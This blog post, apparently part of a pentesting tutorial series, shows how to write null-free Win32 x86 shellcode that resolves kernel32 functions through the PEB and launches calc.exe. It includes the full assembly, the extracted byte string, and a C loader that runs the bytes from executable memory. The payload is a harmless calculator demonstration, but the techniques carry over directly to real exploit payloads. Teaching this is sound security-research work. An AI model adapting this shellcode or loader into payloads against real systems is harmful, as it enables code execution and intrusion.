---
layout: single
title: Win32 Shellcode - Spawn the Calc
date: 2019-11-11
classes: wide
header:
  teaser: /assets/images/shell.png
tags:
  - Assembly
  - Pentester
  - Windows
  - Shellcode
  - x86
--- 
![](/assets/images/shell.png)<br>

## Introduction
[In the last post](https://blackcloud.me/Win32-shellcode-1/) we built what we need to search function addresses in the memory. Now it's time to find this addreses and use they to spawn the Calculator.
First we need to find the ```GetProcAddress``` function, this is the default function we will use to find all others function we need. The basic way to do that is to scroll through the entire array of function, comparing the name of the function we are searching with the name of every element of function array. So getting in deep with this problem we have to split the name ```GetProcAddress``` in 3 elements each of 4 bytes. 

- 0x50746547 = GetP
- 0x41636F72 = rocA
- 0x65726464 = ddre

this 3 elements are enough to find our function. The concept is to load the ```AddressOfNames``` offset in EAX, add the BaseDll address of ```Kerne32.dll``` and start from this point to search our function, comparing the word in EAX with the first element. Once the first element fits, we add 4 bytes to EAX and compare the next element, and so on since we find the the iOrdinal of ```GetProcAddress``` abd save it in EDX register. At this point we can use the ordinal to obtain the ```GetProcAddress``` function pointer address

```nasm
getProcAddress:
	inc ecx                             ; ordinals increment
	lodsd                               ; get "address of name" in eax
	add eax, ebx				
	cmp dword [eax], 0x50746547         ; GetP
	jnz getProcAddress
	cmp dword [eax + 0x4], 0x41636F72   ; rocA
	jnz getProcAddress
	cmp dword [eax + 0x8], 0x65726464   ; ddre
	jnz getProcAddress

getProcAddressFunc:
	mov esi, [edx + 0x24]       ; offset ordinals
	add esi, ebx                ; pointer to the name ordinals table
	mov cx, [esi + ecx * 2]     ; CX = Number of function
	dec ecx
	mov esi, [edx + 0x1c]       ; ESI = Offset address table
	add esi, ebx                ; we placed at the begin of AddressOfFunctions array
	mov edx, [esi + ecx * 4]    ; EDX = Pointer(offset)
	add edx, ebx                ; EDX = getProcAddress
	mov ebp, edx                ; save getProcAddress in EBP for future purpose
```
Now we can user the ```GetProcAddress``` to find the other function needed: ```CreateProcessA```.<br>
To do that we push the name of the new function on the stack and we call the ```GetProcAddress``` to save the ```CreateProcessA``` function pointer address in the EAX register. 

```nasm
getCreateProcessA:
	xor ecx, ecx                    ; zeroing ECX
	push 0x61614173                 ; aaAs
	sub word [esp + 0x2], 0x6161    ; aaAs - aa
	push 0x7365636f                 ; ecor
	push 0x72506574                 ; rPet
	push 0x61657243                 ; aerC
	push esp                        ; push the pointer to stack
	push ebx 						
	call edx                        ; call getprocAddress
```
Now we have to push the process to call in the stack. In this case, the ASCII string ```calc```.
After that we can call the ```CreateProcessA``` to spawn our Calculator

```
getcalc:
    push 0x636c6163             ; 'calc'
    mov ecx, esp                ; stack pointer to 'calc'


    ; Registers situation at this point
	
    ; EAX 75292062 kernel32.CreateProcessA
    ; ECX 0022FB7C ASCII "calc"
    ; EDX 75290000 kernel32.75290000
    ; EBX 75290000 kernel32.75290000
    ; ESP 0022FB7C ASCII "calc"
    ; EBP 0022FF94
    ; ESI 75344DD0 kernel32.75344DD0
    ; EDI 00000000
    ; EIP 00401088 get_calc.00401088

    push ecx                    ; processinfo pointing to 'calc' as a struct argument
    push ecx                    ; startupinfo pointing to 'calc' as a struct argument
    xor edx, edx                ; zero out
    push edx                    ; NULLS
    push edx
    push edx
    push edx
    push edx
    push edx
    push ecx                    ; 'calc'
    push edx
    call eax                    ; call CreateProcessA and spawn calc  
```
Last but not least, we have to exit the process in the same way we founf the ```CreateProcessA``` we can found the ```ExitProcess``` and use it to exit gently.

```nasm
getExitProcess:
	add esp, 0x010              ; clean the stack
	push 0x61737365             ; asse
	sub word [esp + 0x3], 0x61  ; asse -a 
	push 0x636F7250             ; corP
	push 0x74697845             ; tixE
	push esp
	push ebx
	call ebp

	xor ecx, ecx
	push ecx
	call eax
```

### The Shellcode

```nasm
global _start

section .text
_start:


getkernel32:
	xor ecx, ecx                ; zeroing register ECX
	mul ecx                     ; zeroing register EAX EDX
	mov eax, [fs:ecx + 0x030]   ; PEB loaded in eax
	mov eax, [eax + 0x00c]      ; LDR loaded in eax
	mov esi, [eax + 0x014]      ; InMemoryOrderModuleList loaded in esi
	lodsd                       ; program.exe address loaded in eax (1st module)
	xchg esi, eax				
	lodsd                       ; ntdll.dll address loaded (2nd module)
	mov ebx, [eax + 0x10]       ; kernel32.dll address loaded in ebx (3rd module)

	; EBX = base of kernel32.dll address

getAddressofName:
	mov edx, [ebx + 0x3c]       ; load e_lfanew address in ebx
	add edx, ebx				
	mov edx, [edx + 0x78]       ; load data directory
	add edx, ebx
	mov esi, [edx + 0x20]       ; load "address of name"
	add esi, ebx
	xor ecx, ecx

	; ESI = RVAs

getProcAddress:
	inc ecx                             ; ordinals increment
	lodsd                               ; get "address of name" in eax
	add eax, ebx				
	cmp dword [eax], 0x50746547         ; GetP
	jnz getProcAddress
	cmp dword [eax + 0x4], 0x41636F72   ; rocA
	jnz getProcAddress
	cmp dword [eax + 0x8], 0x65726464   ; ddre
	jnz getProcAddress

getProcAddressFunc:
	mov esi, [edx + 0x24]       ; offset ordinals
	add esi, ebx                ; pointer to the name ordinals table
	mov cx, [esi + ecx * 2]     ; CX = Number of function
	dec ecx
	mov esi, [edx + 0x1c]       ; ESI = Offset address table
	add esi, ebx                ; we placed at the begin of AddressOfFunctions array
	mov edx, [esi + ecx * 4]    ; EDX = Pointer(offset)
	add edx, ebx                ; EDX = getProcAddress
	mov ebp, edx                ; save getProcAddress in EBP for future purpose

getCreateProcessA:
	xor ecx, ecx                    ; zeroing ECX
	push 0x61614173	                ; aaAs
	sub word [esp + 0x2], 0x6161    ; aaAs - aa
	push 0x7365636f                 ; ecor
	push 0x72506574                 ; rPet
	push 0x61657243                 ; aerC
	push esp                        ; push the pointer to stack
	push ebx 						
	call edx                        ; call getprocAddress

zero_memory:
    xor ecx, ecx                ; zero out counter register
    mov cl, 0xff                ; we'll loop 255 times (0xff)
    xor edi, edi                ; edi now 0x00000000

    zero_loop:
    push edi                    ; place 0x00000000 on stack 255 times 
    loop zero_loop              ; as a way to 'zero memory' 
    

getcalc:
    push 0x636c6163             ; 'calc'
    mov ecx, esp                ; stack pointer to 'calc'

    ; Registers situation at this point
	
    ; EAX 75292062 kernel32.CreateProcessA
    ; ECX 0022FB7C ASCII "calc"
    ; EDX 75290000 kernel32.75290000
    ; EBX 75290000 kernel32.75290000
    ; ESP 0022FB7C ASCII "calc"
    ; EBP 0022FF94
    ; ESI 75344DD0 kernel32.75344DD0
    ; EDI 00000000
    ; EIP 00401088 get_calc.00401088

    push ecx                    ; processinfo pointing to 'calc' as a struct argument
    push ecx                    ; startupinfo pointing to 'calc' as a struct argument
    xor edx, edx                ; zero out
    push edx                    ; NULLS
    push edx
    push edx
    push edx
    push edx
    push edx
    push ecx                    ; 'calc'
    push edx
    call eax                    ; call CreateProcessA and spawn calc

getExitProcess:
	add esp, 0x010              ; clean the stack
	push 0x61737365	            ; asse
	sub word [esp + 0x3], 0x61  ; asse -a 
	push 0x636F7250             ; corP
	push 0x74697845             ; tixE
	push esp
	push ebx
	call ebp

	xor ecx, ecx
	push ecx
	call eax
```

Compile it and test it

```bash
root@root:# nasm -f elf32 get_calc_shellcode.nasm ; ld -melf_i386 -o get_calc_shellcode get_calc_shellcode.o
root@root:# objdump -d ./get_calc_shellcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc9\xf7\xe1\x64\x8b\x41"
"\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b"
"\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01"
"\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01"
"\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78"
"\x0a\x72\x65\x73\x73\x75\xeb\x8b\x72\x24\x01"
"\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde"
"\x8b\x14\x8e\x01\xda\x89\xd5\x31\xc9\x68\x73"
"\x41\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68"
"\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43"
"\x72\x65\x61\x54\x53\xff\xd2\x31\xc9\xb1\xff"
"\x31\xff\x57\xe2\xfd\x68\x63\x61\x6c\x63\x89"
"\xe1\x51\x51\x31\xd2\x52\x52\x52\x52\x52\x52"
"\x51\x52\xff\xd0\x83\xc4\x10\x68\x65\x73\x73"
"\x61\x66\x83\x6c\x24\x03\x61\x68\x50\x72\x6f"
"\x63\x68\x45\x78\x69\x74\x54\x53\xff\xd5\x31"
"\xc9\x51\xff\xd0"
```
The shellcode.c file

```C
#include <stdio.h>
#include <windows.h>

int main()
{

    char* shellcode = \
    "\x31\xc9\xf7\xe1\x64\x8b\x41"
    "\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b"
    "\x58\x10\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01"
    "\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01"
    "\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78"
    "\x0a\x72\x65\x73\x73\x75\xeb\x8b\x72\x24\x01"
    "\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde"
    "\x8b\x14\x8e\x01\xda\x89\xd5\x31\xc9\x68\x73"
    "\x41\x61\x61\x66\x81\x6c\x24\x02\x61\x61\x68"
    "\x6f\x63\x65\x73\x68\x74\x65\x50\x72\x68\x43"
    "\x72\x65\x61\x54\x53\xff\xd2\x31\xc9\xb1\xff"
    "\x31\xff\x57\xe2\xfd\x68\x63\x61\x6c\x63\x89"
    "\xe1\x51\x51\x31\xd2\x52\x52\x52\x52\x52\x52"
    "\x51\x52\xff\xd0\x83\xc4\x10\x68\x65\x73\x73"
    "\x61\x66\x83\x6c\x24\x03\x61\x68\x50\x72\x6f"
    "\x63\x68\x45\x78\x69\x74\x54\x53\xff\xd5\x31"
    "\xc9\x51\xff\xd0"; 
			
    printf("shellcode length: %i", strlen(shellcode));

    LPVOID lpAlloc = VirtualAlloc(0, 4096, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(lpAlloc, shellcode, strlen(shellcode));

    ((void(*)())lpAlloc)();

    return 0;
}
```
Compile it on Windows 
```dos
c:\MinGW\bin>gcc shellcode.c -o shellcode
```

Windows 7 (x86)
![](/assets/images/windows/x86/getcalc_0.gif)<br>

and Windows 10 (x86)

![](/assets/images/windows/x86/getcalc_1.gif)<br>

The length is 176 bytes and is NULL free 
